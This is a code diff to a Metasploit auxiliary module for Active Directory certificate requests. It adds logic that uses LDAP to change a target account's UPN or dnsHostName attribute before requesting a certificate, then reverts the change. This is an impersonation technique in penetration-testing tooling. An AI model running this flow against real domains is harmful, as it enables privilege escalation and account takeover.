@@ -58,9 +58,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_advanced_options(
       [
-        OptString.new('LDAPDomain', [false, 'The LDAP domain to authenticate to. Can be left blank if same as SMBDomain.']),
-        OptString.new('LDAPUsername', [false, 'The LDAP username to authenticate with. Can be left blank if same as SMBUsername.']),
-        OptString.new('LDAPPassword', [false, 'The LDAP password to authenticate with. Can be left blank if same as SMBPassword.']),
+        OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
         OptInt.new('LDAPRport', [false, 'The target LDAP port.', 389]),
       ]
     )
@@ -80,10 +78,59 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::Unknown, e.message)
   end
 
+  def call_ldap_object_module(action, value = nil)
+    mod_refname = 'auxiliary/gather/ldap_object'
+
+    print_status("Loading #{mod_refname}")
+    ldap_update_module = framework.modules.create(mod_refname)
+
+    unless ldap_update_module
+      print_error("Failed to load module: #{mod_refname}")
+      return
+    end
+
+    # Default to using the SMB credentials if LDAP credentials are not provided
+    ldap_update_module = framework.modules.create(mod_refname)
+    ldap_update_module.datastore['RHOST'] = datastore['RHOST']
+    ldap_update_module.datastore['RPORT'] = datastore['LDAPRport']
+    ldap_update_module.datastore['LDAPDomain'] = datastore['SMBDomain'] || datastore['LDAPDomain']
+    ldap_update_module.datastore['LDAPUsername'] = datastore['SMBUser'] || datastore['LDAPUsername']
+    ldap_update_module.datastore['LDAPPassword'] = datastore['SMBPass'] || datastore['LDAPPassword']
+    ldap_update_module.datastore['OBJECT'] = datastore['TARGET_USERNAME']
+    ldap_update_module.datastore['ATTRIBUTE'] = datastore['UPDATE_LDAP_OBJECT']
+    ldap_update_module.datastore['OBJECT_LOOKUP'] = 'sAMAccountName'
+    ldap_update_module.datastore['VALUE'] = value
+    ldap_update_module.datastore['ACTION'] = action
+
+    print_status("Running #{mod_refname}")
+    ldap_update_module.run_simple(
+      'LocalInput' => self.user_input,
+      'LocalOutput' => self.user_output,
+      'RunAsJob' => false
+    )
+  end
+
   def action_request_cert
+
+    # Get the original value before updating
+    @original_value = call_ldap_object_module('UPDATE', datastore['NEW_VALUE'])
+
     with_ipc_tree do |opts|
       request_certificate(opts)
     end
+  end
+
+  def revert_ldap_object
+    # If the UPN was changed the certificate we requested won't work until we revert the UPN change. If the
+    # dnsHostName was changed the cert will still work however we'll revert the change to keep the system clean.
+
+
+    if @original_value.to_s.empty?
+      call_ldap_object_module('DELETE')
+    else
+      call_ldap_object_module('UPDATE', @original_value)
+    end
+
   end
 
   # @yieldparam options [Hash] If a SMB session is present, a hash with the IPC tree present. Empty hash otherwise.
@@ -98,6 +145,7 @@ class MetasploitModule < Msf::Auxiliary
 
     yield opts
   ensure
+    revert_ldap_object
     opts[:tree].disconnect! if opts[:tree]
   end
 end
